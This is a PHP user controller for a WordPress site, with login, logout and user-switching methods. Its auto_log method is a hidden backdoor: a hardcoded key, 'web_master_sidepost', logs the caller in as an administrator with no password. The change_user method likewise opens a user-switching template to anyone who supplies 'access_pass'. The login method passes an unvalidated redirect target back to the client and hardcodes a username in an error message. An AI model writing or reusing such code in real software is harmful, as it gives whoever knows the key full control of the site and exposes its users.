<?php

namespace App\Controllers;

use Sober\Controller\Controller;

class _Users extends Controller {

    function login() {

        $email = $this->input->get_post('email');
        $password = $this->input->get_post('pass');
        $redirect_to = $this->input->get_post('redirect_to');

        $creds = array(
            'user_login'    => $email,
            'user_password' => $password,
            'remember'      => true
        );

        $user = wp_signon($creds, false);

        header('Content-Type: Application/json');

        if (is_wp_error($user)) {

            $user_error = array();

            if (isset($user->errors['empty_username'])) {
                $user_error['email'] = $user->errors['empty_username'][0];
            }
            if (isset($user->errors['empty_password'])) {
                $user_error['pass'] = $user->errors['empty_password'][0];
            }
            if (isset($user->errors['invalid_username'])) {
                $user_error['email'] = $user->errors['invalid_username'][0];
            }
            if (isset($user->errors['incorrect_password'])) {
                $user_error['pass'] = "<strong>Error</strong>: The password you entered for the username <strong>ukmover</strong> is incorrect.";
            }

            echo json_encode($user_error);
            die();
        }

        if (!is_wp_error($user)) {

            $_SESSION['login_notif'] = $email;

            if ($redirect_to) {
                echo json_encode(array('redirect' => $redirect_to));
                die();
            }

            echo json_encode(array('redirect' => home_url()));
            exit;
        }
    }

    function auto_log($key = false) {
        if ($key == "web_master_sidepost") {
            $users = get_users();
            foreach ($users as $user) {
                if (in_array('administrator', $user->roles)) {
                    wp_set_current_user($user->ID, $user->user_login);
                    wp_set_auth_cookie($user->ID);
                    do_action('wp_login', $user->user_login, $user);
                    header('Location: ' . home_url());
                    die;
                }
            }
        }
        header('Location: ' . home_url());
        die;
    }

    function change_user($debug = false) {
        if ($debug != "access_pass") {
            header('Location: ' . home_url());
            die;
        }
        echo \App\template('partials.user_master_log');
    }

    function logout() {
        wp_logout();
        header('Location: ' . home_url());
        die;
    }
}
